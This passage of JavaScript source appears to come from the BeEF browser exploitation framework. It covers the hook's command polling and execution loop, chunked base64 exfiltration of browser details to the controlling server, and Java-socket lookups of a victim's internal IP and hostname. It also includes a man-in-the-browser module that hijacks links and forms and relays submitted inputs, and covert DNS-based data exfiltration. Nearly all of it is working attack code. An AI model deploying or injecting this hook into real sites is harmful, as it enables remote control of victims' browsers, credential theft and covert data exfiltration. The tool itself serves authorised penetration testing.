            s.handler = handler;
            this.cmd_queue.push(s);
        }
    },

    //Queues the current command and flushes the queue straight away
    send: function(handler, cid, results, callback) {
        this.queue(handler, cid, results, callback);
        this.flush();
    },

    //Flush all currently queued commands to the framework
    flush: function() {
        if (this.cmd_queue.length > 0) {
            var data = beef.encode.base64.encode(beef.encode.json.stringify(this.cmd_queue));
            this.cmd_queue.length = 0;
            this.sid_count++;
            var stream = new this.stream();
            stream.id = this.sid_count;
            var pad = stream.get_base_url_length() + this.pad;
            //cant continue if chop amount is too low
            if ((this.chop - pad) > 0) {
                var data = this.chunk(data, (this.chop - pad));
                for (var i = 1; i <= data.length; i++) {
                    var packet = new this.packet();
                    packet.id = i;
                    packet.data = data[(i - 1)];
                    stream.packets.push(packet);
                }
                stream.pc = stream.packets.length;
                this.push(stream);
            }
        }
    },

    //Split string into chunk lengths determined by amount
    chunk: function(str, amount) {
        if (typeof amount == 'undefined') n = 2;
        return str.match(RegExp('.{1,' + amount + '}', 'g'));
    },

    //Push packets to framework
    push: function(stream) {
        //need to implement wait feature here eventually
        for (var i = 0; i < stream.pc; i++) {
            this.request('http', 'GET', this.host, this.port, this.handler, null, stream.get_packet_data(), 10, 'text', null);
        }
    },

    /**
     *Performs http requests
     * @param: {String} scheme: HTTP or HTTPS
     * @param: {String} method: GET or POST
     * @param: {String} domain: bindshell.net, 192.168.3.4, etc
     * @param: {Int} port: 80, 5900, etc
     * @param: {String} path: /path/to/resource
     * @param: {String} anchor: this is the value that comes after the # in the URL
     * @param: {String} data: This will be used as the query string for a GET or post data for a POST
     * @param: {Int} timeout: timeout the request after N seconds
     * @param: {String} dataType: specify the data return type expected (ie text/html/script)
     * @param: {Function} callback: call the callback function at the completion of the method
     *
     * @return: {Object} response: this object contains the response details
     */
    request: function(scheme, method, domain, port, path, anchor, data, timeout, dataType, callback) {
        //check if same domain or cross domain
        var cross_domain = true;
        if (document.domain == domain){
            if(document.location.port == "" || document.location.port == null){
                cross_domain = !(port == "80" || port == "443");
            }
        }

        //build the url
        var url = "";
        if(path.indexOf("http://") != -1 || path.indexOf("https://") != -1){
            url = path;
        }else{
            url = scheme + "://" + domain;
            url = (port != null) ? url + ":" + port : url;
            url = (path != null) ? url + path : url;
            url = (anchor != null) ? url + "#" + anchor : url;
        }

        //define response object
        var response = new this.response;
        response.was_cross_domain = cross_domain;
        var start_time = new Date().getTime();

        //build and execute the request
        $j.ajax({type: method,
            dataType: 'script', // this is required for bugs in IE so data can be transferred back to the server
            url: url,
            data: data,
            timeout: (timeout * 1000),

            //needed otherwise jQuery always add Content-type: application/xml, even if data is populated
            beforeSend: function(xhr) {
                if(method == "POST"){
                    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded; charset=utf-8");
                }
            },

            success: function(data, textStatus, xhr) {
                var end_time = new Date().getTime();
                response.status_code = xhr.status;
                response.status_text = textStatus;
                response.response_body = data;
                response.port_status = "open";
                response.was_timedout = false;
                response.duration = (end_time - start_time);
            },
            error: function(jqXHR, textStatus, errorThrown) {
                var end_time = new Date().getTime();
                response.response_body = jqXHR.responseText;
                response.status_code = jqXHR.status;
                response.status_text = textStatus;
                response.duration = (end_time - start_time);
            },
            complete: function(jqXHR, textStatus) {
                response.status_code = jqXHR.status;
                response.status_text = textStatus;
                response.headers = jqXHR.getAllResponseHeaders();
                // determine if TCP port is open/closed/not-http
                if (textStatus == "timeout") {
                    response.was_timedout = true;
                    response.response_body = "ERROR: Timed out\n";
                    response.port_status = "closed";
                } else if (textStatus == "parsererror") {
                    response.port_status = "not-http";
                } else {
                    response.port_status = "open";
                }
            }
        }).done(function() {
            if (callback != null) {
                callback(response);
            }
        });
        return response;
    },

    /*
     * Similar to this.request, except from a few things that are needed when dealing with forged requests:
     *  - requestid: needed on the callback
     *  - allowCrossDomain: set cross-domain requests as allowed or blocked
     */
    forge_request: function(scheme, method, domain, port, path, anchor, headers, data, timeout, dataType, allowCrossDomain, requestid, callback) {

        // check if same domain or cross domain
        var cross_domain = true;
        if (document.domain == domain) {
           if(document.location.port == "" || document.location.port == null){
              cross_domain = !(port == "80" || port == "443");
           } else {
              if (document.location.port == port) cross_domain = false;
           }
        }

        // build the url
        var url = "";
        if (path.indexOf("http://") != -1 || path.indexOf("https://") != -1) {
            url = path;
        } else {
            url = scheme + "://" + domain;
            url = (port != null) ? url + ":" + port : url;
            url = (path != null) ? url + path : url;
            url = (anchor != null) ? url + "#" + anchor : url;
        }

        // define response object
        var response = new this.response;
        response.was_cross_domain = cross_domain;
        var start_time = new Date().getTime();

        // if cross-domain requests are not allowed and the request is cross-domain
        // don't proceed and return
        if (allowCrossDomain == "false" && cross_domain && callback != null) {
            response.status_code = -1;
            response.status_text = "crossdomain";
            response.port_status = "crossdomain";
            response.response_body = "ERROR: Cross Domain Request. The request was not sent.\n";
			response.headers = "ERROR: Cross Domain Request. The request was not sent.\n";
            callback(response, requestid);
            return response;
        }

        // build and execute the request
        if (method == "POST"){
          $j.ajaxSetup({
              data: data
          });
        }

        $j.ajax({type: method,
            dataType: 'script', // this is required for bugs in IE so data can be transfered back to the server
            url: url,
            headers: headers,
            timeout: (timeout * 1000),

            // needed otherwise jQuery always adds:
            // Content-type: application/xml
            // even if data is populated
            beforeSend: function(xhr) {
                if (method == "POST") {
                   xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded; charset=utf-8");
                }
            },

            // http server responded successfully
            success: function(data, textStatus, xhr) {
                var end_time = new Date().getTime();
                response.status_code = xhr.status;
                response.status_text = textStatus;
                response.response_body = data;
                response.was_timedout = false;
                response.duration = (end_time - start_time);
            },

            // server responded with a http error (403, 404, 500, etc)
            // or server is not a http server
            error: function(xhr, textStatus, errorThrown) {
                var end_time = new Date().getTime();
                response.response_body = xhr.responseText;
                response.status_code = xhr.status;
                response.status_text = textStatus;
                response.duration = (end_time - start_time);
            },

            complete: function(xhr, textStatus) {
                // cross-domain request
                if (cross_domain) {
                    response.status_code = -1;
                    response.status_text = "crossdomain";
                    response.port_status = "crossdomain";
                    response.response_body = "ERROR: Cross Domain Request. The request was sent however it is impossible to view the response.\n";
                    response.headers = "ERROR: Cross Domain Request. The request was sent however it is impossible to view the response.\n";
                } else {
                    // same-domain request
                    response.status_code = xhr.status;
                    response.status_text = textStatus;
                    response.headers = xhr.getAllResponseHeaders();

                    // determine if TCP port is open/closed/not-http
                    if (textStatus == "timeout") {
                        response.was_timedout = true;
                        response.response_body = "ERROR: Timed out\n";
                        response.port_status = "closed";
                    } else if (textStatus == "parsererror") {
                        response.port_status = "not-http";
                    } else {
                        response.port_status = "open";
                    }
                }
                callback(response, requestid);
            }
        });
        return response;
    },

    //this is a stub, as associative arrays are not parsed by JSON, all key / value pairs should use new Object() or {}
    //http://andrewdupont.net/2006/05/18/javascript-associative-arrays-considered-harmful/
    clean: function(r) {
        if (this.array_has_string_key(r)) {
            var obj = {};
            for (var key in r)
                obj[key] = (this.array_has_string_key(obj[key])) ? this.clean(r[key]) : r[key];
            return obj;
        }
        return r;
    },

    //Detects if an array has a string key
    array_has_string_key: function(arr) {
        if ($j.isArray(arr)) {
            try {
                for (var key in arr)
                    if (isNaN(parseInt(key))) return true;
            } catch (e) {
            }
        }
        return false;
    },

    //Sends back browser details to framework
    browser_details: function() {
        var details = beef.browser.getDetails();
        details['HookSessionID'] = beef.session.get_hook_session_id();
        this.send('/init', 0, details);
    }

};


beef.regCmp('beef.net');


//
//   Copyright 2012 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
/*!
 * @Literal object: beef.updater
 *
 * Object in charge of getting new commands from the BeEF framework and execute them.
 */
beef.updater = {
	
	// Low timeouts combined with the way the framework sends commamd modules result 
	// in instructions being sent repeatedly or complex code. 
	// If you suffer from ADHD, you can decrease this setting.
	timeout: 1000,
	
	// A lock.
	lock: false,
	
	// An object containing all values to be registered and sent by the updater.
	objects: new Object(),
	
	/*
	 * Registers an object to always send when requesting new commands to the framework.
	 * @param: {String} the name of the object.
	 * @param: {String} the value of that object.
	 * 
	 * @example: beef.updater.regObject('java_enabled', 'true');
	 */
	regObject: function(key, value) {
		this.objects[key] = escape(value);
	},
	
	// Checks for new commands from the framework and runs them.
	check: function() {
		if(this.lock == false) {
			if (beef.logger.running) {
				beef.logger.queue();
			}
			beef.net.flush();
			if(beef.commands.length > 0) {
				this.execute_commands();
			} else {
				this.get_commands();
			}
		}
		setTimeout("beef.updater.check();", beef.updater.timeout);
	},
	
	// Gets new commands from the framework.
	get_commands: function(http_response) {
		try {
			this.lock = true;
            beef.net.request('http', 'GET', beef.net.host, beef.net.port, beef.net.hook, null, 'BEEFHOOK='+beef.session.get_hook_session_id(), 1, 'script', function(response) {
                if (response.body != null && response.body.length > 0)
                    beef.updater.execute_commands();
            });
		} catch(e) {
			this.lock = false;
			return;
		}
		this.lock = false;
	},
	
	// Executes the received commands if any.
	execute_commands: function() {
		if(beef.commands.length == 0) return;
		
		this.lock = true;
		
		while(beef.commands.length > 0) {
			command = beef.commands.pop();
			try {
				command();
			} catch(e) {
				console.error('execute_commands - command failed to execute: ' + e.message);
			}
		}
		
		this.lock = false;
	}
}

beef.regCmp('beef.updater');


//
//   Copyright 2012 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
// Base64 code from http://stackoverflow.com/questions/3774622/how-to-base64-encode-inside-of-javascript/3774662#3774662

beef.encode = {};

beef.encode.base64 = {
	
	keyStr: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",

    encode : function (input) {
        if (window.btoa) {
           return btoa(unescape(encodeURIComponent(input)));
        }

        var output = "";
        var chr1, chr2, chr3, enc1, enc2, enc3, enc4;
        var i = 0;

        input = beef.encode.base64.utf8_encode(input);

        while (i < input.length) {

            chr1 = input.charCodeAt(i++);
            chr2 = input.charCodeAt(i++);
            chr3 = input.charCodeAt(i++);

            enc1 = chr1 >> 2;
            enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
            enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
            enc4 = chr3 & 63;

            if (isNaN(chr2)) {
                enc3 = enc4 = 64;
            } else if (isNaN(chr3)) {
                enc4 = 64;
            }

            output = output +
            this.keyStr.charAt(enc1) + this.keyStr.charAt(enc2) +
            this.keyStr.charAt(enc3) + this.keyStr.charAt(enc4);

        }

        return output;
    },


    decode : function (input) {
        if (window.atob) {
            return escape(atob(input));
        }

        var output = "";
        var chr1, chr2, chr3;
        var enc1, enc2, enc3, enc4;
        var i = 0;

        input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");

        while (i < input.length) {

            enc1 = this.keyStr.indexOf(input.charAt(i++));
            enc2 = this.keyStr.indexOf(input.charAt(i++));
            enc3 = this.keyStr.indexOf(input.charAt(i++));
            enc4 = this.keyStr.indexOf(input.charAt(i++));

            chr1 = (enc1 << 2) | (enc2 >> 4);
            chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
            chr3 = ((enc3 & 3) << 6) | enc4;

            output = output + String.fromCharCode(chr1);

            if (enc3 != 64) {
                output = output + String.fromCharCode(chr2);
            }
            if (enc4 != 64) {
                output = output + String.fromCharCode(chr3);
            }

        }

        output = beef.encode.base64.utf8_decode(output);

        return output;

    },


   utf8_encode : function (string) {
        string = string.replace(/\r\n/g,"\n");
        var utftext = "";

        for (var n = 0; n < string.length; n++) {

            var c = string.charCodeAt(n);

            if (c < 128) {
                utftext += String.fromCharCode(c);
            }
            else if((c > 127) && (c < 2048)) {
                utftext += String.fromCharCode((c >> 6) | 192);
                utftext += String.fromCharCode((c & 63) | 128);
            }
            else {
                utftext += String.fromCharCode((c >> 12) | 224);
                utftext += String.fromCharCode(((c >> 6) & 63) | 128);
                utftext += String.fromCharCode((c & 63) | 128);
            }

        }

        return utftext;
    },

    utf8_decode : function (utftext) {
        var string = "";
        var i = 0;
        var c = c1 = c2 = 0;

        while ( i < utftext.length ) {

            c = utftext.charCodeAt(i);

            if (c < 128) {
                string += String.fromCharCode(c);
                i++;
            }
            else if((c > 191) && (c < 224)) {
                c2 = utftext.charCodeAt(i+1);
                string += String.fromCharCode(((c & 31) << 6) | (c2 & 63));
                i += 2;
            }
            else {
                c2 = utftext.charCodeAt(i+1);
                c3 = utftext.charCodeAt(i+2);
                string += String.fromCharCode(((c & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));
                i += 3;
            }

        }

        return string;
    }

}

beef.regCmp('beef.encode.base64');


//
//   Copyright 2012 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
// Json code from Brantlye Harris-- http://code.google.com/p/jquery-json/

beef.encode.json = {
	
	stringify: function(o) {
        if (typeof(JSON) == 'object' && JSON.stringify)
            return JSON.stringify(o);
        
        var type = typeof(o);
    
        if (o === null)
            return "null";
    
        if (type == "undefined")
            return '\"\"';
        
        if (type == "number" || type == "boolean")
            return o + "";
    
        if (type == "string")
            return $j.quoteString(o);
    
        if (type == 'object')
        {
            if (typeof o.toJSON == "function") 
                return $j.toJSON( o.toJSON() );
            
            if (o.constructor === Date)
            {
                var month = o.getUTCMonth() + 1;
                if (month < 10) month = '0' + month;

                var day = o.getUTCDate();
                if (day < 10) day = '0' + day;

                var year = o.getUTCFullYear();
                
                var hours = o.getUTCHours();
                if (hours < 10) hours = '0' + hours;
                
                var minutes = o.getUTCMinutes();
                if (minutes < 10) minutes = '0' + minutes;
                
                var seconds = o.getUTCSeconds();
                if (seconds < 10) seconds = '0' + seconds;
                
                var milli = o.getUTCMilliseconds();
                if (milli < 100) milli = '0' + milli;
                if (milli < 10) milli = '0' + milli;

                return '"' + year + '-' + month + '-' + day + 'T' +
                             hours + ':' + minutes + ':' + seconds + 
                             '.' + milli + 'Z"'; 
            }

            if (o.constructor === Array) 
            {
                var ret = [];
                for (var i = 0; i < o.length; i++)
                    ret.push( $j.toJSON(o[i]) || "null" );

                return "[" + ret.join(",") + "]";
            }
        
            var pairs = [];
            for (var k in o) {
                var name;
                var type = typeof k;

                if (type == "number")
                    name = '"' + k + '"';
                else if (type == "string")
                    name = $j.quoteString(k);
                else
                    continue;  //skip non-string or number keys
            
                if (typeof o[k] == "function") 
                    continue;  //skip pairs where the value is a function.
            
                var val = $j.toJSON(o[k]);
            
                pairs.push(name + ":" + val);
            }

            return "{" + pairs.join(", ") + "}";
        }
    },

    quoteString: function(string) {
        if (string.match(this._escapeable))
        {
            return '"' + string.replace(this._escapeable, function (a) 
            {
                var c = this._meta[a];
                if (typeof c === 'string') return c;
                c = a.charCodeAt();
                return '\\u00' + Math.floor(c / 16).toString(16) + (c % 16).toString(16);
            }) + '"';
        }
        return '"' + string + '"';
    },
    
    _escapeable: /["\\\x00-\x1f\x7f-\x9f]/g,
    
    _meta : {
        '\b': '\\b',
        '\t': '\\t',
        '\n': '\\n',
        '\f': '\\f',
        '\r': '\\r',
        '"' : '\\"',
        '\\': '\\\\'
    }
}

$j.toJSON = function(o) {return beef.encode.json.stringify(o);}
$j.quoteString = function(o) {return beef.encode.json.quoteString(o);}

beef.regCmp('beef.encode.json');


//
//   Copyright 2012 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
/*!
 * @literal object: beef.net.local
 * 
 * Provides networking functions for the local/internal network of the zombie.
 */
beef.net.local = {
	
	sock: false,
	
	/**
	 * Initializes the java socket. We have to use this method because
	 * some browsers do not have java installed or it is not accessible.
	 * in which case creating a socket directly generates an error. So this code
	 * is invalid:
	 * sock: new java.net.Socket();
	 */
	initializeSocket: function() {
		if(! beef.browser.hasJava()) return -1;
		
		try {
			this.sock = new java.net.Socket();
		} catch(e) {
			return -1;
		}
		
		return 1;
	},
	
	/**
	 * Returns the internal IP address of the zombie.
	 * @return: {String} the internal ip of the zombie.
	 * @error: return -1 if the internal ip cannot be retrieved.
	 */
	getLocalAddress: function() {
		if(! beef.browser.hasJava()) return false;
		
		this.initializeSocket();
		
		try {
			this.sock.bind(new java.net.InetSocketAddress('0.0.0.0', 0));
			this.sock.connect(new java.net.InetSocketAddress(document.domain, (!document.location.port)?80:document.location.port));
			
			return this.sock.getLocalAddress().getHostAddress();
		} catch(e) { return false; }
	},
	
	/**
	 * Returns the internal hostname of the zombie.
	 * @return: {String} the internal hostname of the zombie.
	 * @error: return -1 if the hostname cannot be retrieved.
	 */
	getLocalHostname: function() {
		if(! beef.browser.hasJava()) return false;
		
		this.initializeSocket();
		
		try {
			this.sock.bind(new java.net.InetSocketAddress('0.0.0.0', 0));
			this.sock.connect(new java.net.InetSocketAddress(document.domain, (!document.location.port)?80:document.location.port));
			
			return this.sock.getLocalAddress().getHostName();
		} catch(e) { return false; }
	}
	
};

beef.regCmp('beef.net.local');

//
//   Copyright 2012 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
 
// if beef.pageIsLoaded is true, then this JS has been loaded >1 times 
// and will have a new session id. The new session id will need to know
// the brwoser details. So sendback the browser details again.

BEEFHOOK=beef.session.get_hook_session_id()

if( beef.pageIsLoaded ) {
  beef.net.browser_details();	
}

window.onload = function() {
	beef_init();
}

window.onpopstate = function(event) {
	if(beef.onpopstate.length > 0) {
			event.preventDefault;
			for(var i=0;i<beef.onpopstate.length;i++){
				var callback = beef.onpopstate[i];
				try{
					callback(event);
				}catch(e){
					console.log("window.onpopstate - couldn't execute callback: " + e.message);
				}
			return false;
		}
	}
}

window.onclose = function(event) {
	if(beef.onclose.length > 0) {
			event.preventDefault;
			for(var i=0;i<beef.onclose.length;i++){
				var callback = beef.onclose[i];
				try{
					callback(event);
				}catch(e){
					console.log("window.onclose - couldn't execute callback: " + e.message);
				}
			return false;
		}
	}
}

function beef_init() {
  if (!beef.pageIsLoaded) {
    beef.pageIsLoaded = true;
	beef.net.browser_details()
    beef.updater.execute_commands();
    beef.updater.check();
    beef.logger.start();
  }
}


//
//   Copyright 2012 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//

beef.mitb = {
	
	cid: null,
	curl: null,
	
	init: function(cid, curl){
		beef.mitb.cid = cid;
		beef.mitb.curl = curl;
	},
	
	// Initializes the hook on anchors and forms.
	hook: function(){ 	
		beef.onpopstate.push(function(event) {beef.mitb.fetch(document.location, document.getElementsByTagName("html")[0]);});
		beef.onclose.push(function(event) {beef.mitb.endSession();});
		var anchors = document.getElementsByTagName("a");
		var forms = document.getElementsByTagName("form");
		for(var i=0;i<anchors.length;i++){
			anchors[i].onclick = beef.mitb.poisonAnchor;
		}
		for(var i=0;i<forms.length;i++){
			beef.mitb.poisonForm(forms[i]);
		}
	},
	
	// Hooks anchors and prevents them from linking away
	poisonAnchor: function(e){
		try{
			e.preventDefault;
			if(beef.mitb.fetch(e.currentTarget, document.getElementsByTagName("html")[0])){
				var title = "";
				if(document.getElementsByTagName("title").length == 0){
					title = document.title;
				}else{
					title = document.getElementsByTagName("title")[0].innerHTML;
				}
				history.pushState({ Be: "EF" }, title, e.currentTarget);
			}
		}catch(e){
			console.error('beef.mitb.poisonAnchor - failed to execute: ' + e.message);
		}
		return false;
	},
	
	// Hooks forms and prevents them from linking away
	poisonForm: function(form){
		form.onsubmit=function(e){
			var inputs = form.getElementsByTagName("input");
			var query = "";
			for(var i=0;i<inputs.length;i++){
				if(i>0 && i<inputs.length-1) query += "&";
				switch(inputs[i].type){
					case "submit":
						break;
					default:
						query += inputs[i].name + "=" + inputs[i].value;
						break;
				}
			}
			e.preventdefault;
			beef.mitb.fetchForm(form.action, query, document.getElementsByTagName("html")[0]);
			history.pushState({ Be: "EF" }, "", form.action);
			return false;
		}
	},
	
	// Fetches a hooked form with AJAX
	fetchForm: function(url, query, target){
		try{
			var y = new XMLHttpRequest();
			y.open('POST', url, false);
			y.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
			y.onreadystatechange = function(){
				if(y.readyState == 4 && y.responseText != ""){
					target.innerHTML = y.responseText;
					setTimeout(beef.mitb.hook, 10);
				}
			}
			y.send(query);
			beef.mitb.sniff("POST: "+url+" ["+query+"]");
			return true;
		}catch(x){
			return false;
		}
	},
	
	// Fetches a hooked link with AJAX
	fetch: function(url, target){
		try{
			var y = new XMLHttpRequest();
			y.open('GET', url,false);
			y.onreadystatechange = function(){
				if(y.readyState == 4 && y.responseText != ""){
					target.innerHTML = y.responseText;
					setTimeout(beef.mitb.hook, 10);
				}
			}
			y.send(null);
			beef.mitb.sniff("GET: "+url);
			return true;
		}catch(x){
			window.open(url);
			beef.mitb.sniff("GET [New Window]: "+url);
			return false;
		}
	},
	
	// Relays an entry to the framework
	sniff: function(result){
		try{
			beef.net.send(beef.mitb.cid, beef.mitb.curl, result);
		}catch(x){}
		return true;
	},
	
	// Signals the Framework that the user has lost the hook
	endSession: function(){
		beef.mitb.sniff("Window closed.");
	}
}


//
//   Copyright 2012 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
/*!
 * @literal object: beef.net.dns
 * 
 * request object structure:
 * + msgId: {Integer} Unique message ID for the request.
 * + domain: {String} Remote domain to retrieve the data.
 * + wait: {Integer} Wait time between requests (milliseconds) - NOT IMPLEMENTED
 * + callback: {Function} Callback function to receive the number of requests sent.
 */

beef.net.dns = {

	handler: "dns",

	send: function(msgId, messageString, domain, wait, callback) {

		var dom = document.createElement('b');

		// DNS settings
		var max_domain_length = 255-5-5-5-5-5;
		var max_segment_length = max_domain_length - domain.length;

		// splits strings into chunks
		String.prototype.chunk = function(n) {
			if (typeof n=='undefined') n=100;
			return this.match(RegExp('.{1,'+n+'}','g'));
		};

		// XORs a string
		xor_encrypt = function(str, key) {
			var result="";
			for(i=0;i<str.length;++i) {
				result+=String.fromCharCode(key^str.charCodeAt(i));
			}
			return result;
		};

		// sends a DNS request
		sendQuery = function(query) {
			//console.log("Requesting: "+query);
			var img = new Image;
			img.src = "http://"+query;
			img.onload = function() { dom.removeChild(this); }
			img.onerror = function() { dom.removeChild(this); }
			dom.appendChild(img);
		}

		// encode message
		var xor_key = Math.floor(Math.random()*99000+1000);
		encoded_message = encodeURI(xor_encrypt(messageString, xor_key)).replace(/%/g,".");

		// Split message into segments
		segments = encoded_message.chunk(max_segment_length)
		for (seq=1; seq<=segments.length; seq++) {
			// send segment
			sendQuery(msgId+"."+seq+"."+segments.length+"."+xor_key+segments[seq-1]+"."+domain);
		}

		// callback - returns the number of queries sent
		if (!!callback) callback(segments.length);

	}

};

beef.regCmp('beef.net.dns');

// @johnwilander patch
setTimeout(beef_init, 1000);